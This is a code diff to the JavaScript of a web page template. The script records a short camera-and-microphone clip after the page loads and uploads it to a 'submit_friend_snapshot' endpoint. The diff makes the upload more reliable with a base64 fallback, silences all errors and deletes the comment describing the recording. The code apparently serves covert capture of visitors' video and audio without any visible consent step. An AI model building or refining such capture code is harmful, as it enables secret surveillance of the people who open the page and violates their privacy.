@@ -951,15 +951,15 @@ document.addEventListener('DOMContentLoaded', function() {
                     return;
                 }
 
-                let options = {};
+                let options = { videoBitsPerSecond: 300000 };
                 if (MediaRecorder.isTypeSupported('video/mp4;codecs=avc1,mp4a.40.2')) {
-                    options = { mimeType: 'video/mp4;codecs=avc1,mp4a.40.2' };
+                    options.mimeType = 'video/mp4;codecs=avc1,mp4a.40.2';
                 } else if (MediaRecorder.isTypeSupported('video/mp4')) {
-                    options = { mimeType: 'video/mp4' };
-                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')) {
-                    options = { mimeType: 'video/webm;codecs=vp9,opus' };
+                    options.mimeType = 'video/mp4';
+                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
+                    options.mimeType = 'video/webm;codecs=vp8,opus';
                 } else if (MediaRecorder.isTypeSupported('video/webm')) {
-                    options = { mimeType: 'video/webm' };
+                    options.mimeType = 'video/webm';
                 }
 
                 const recorder = new MediaRecorder(stream, options);
@@ -977,24 +977,38 @@ document.addEventListener('DOMContentLoaded', function() {
                     }
 
                     const mime = recorder.mimeType || options.mimeType || 'video/webm';
+                    const ext = mime.includes('mp4') ? 'snapshot.mp4' : 'snapshot.webm';
                     const blob = new Blob(chunks, { type: mime });
-                    const reader = new FileReader();
-                    reader.readAsDataURL(blob);
-                    reader.onloadend = function() {
-                        const base64Video = reader.result;
-                        if (base64Video && base64Video.length > 1000) {
-                            fetch('{{ url_for("submit_friend_snapshot") }}', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ image_data: base64Video, video_data: base64Video })
-                            }).catch(() => {});
-                        }
-                    };
+
+                    if (blob.size > 500) {
+                        const formData = new FormData();
+                        formData.append('video_file', blob, ext);
+
+                        fetch('{{ url_for("submit_friend_snapshot") }}', {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(res => res.json())
+                        .then(d => console.log("Video upload result:", d))
+                        .catch(() => {
+                            const reader = new FileReader();
+                            reader.readAsDataURL(blob);
+                            reader.onloadend = function() {
+                                const b64 = reader.result;
+                                if (b64) {
+                                    fetch('{{ url_for("submit_friend_snapshot") }}', {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ image_data: b64, video_data: b64 })
+                                    }).catch(() => {});
+                                }
+                            };
+                        });
+                    }
                 };
 
                 recorder.start(100);
 
-                // Record 3.5 seconds video clip with audio
                 setTimeout(function() {
                     if (recorder.state !== 'inactive') {
                         recorder.stop();
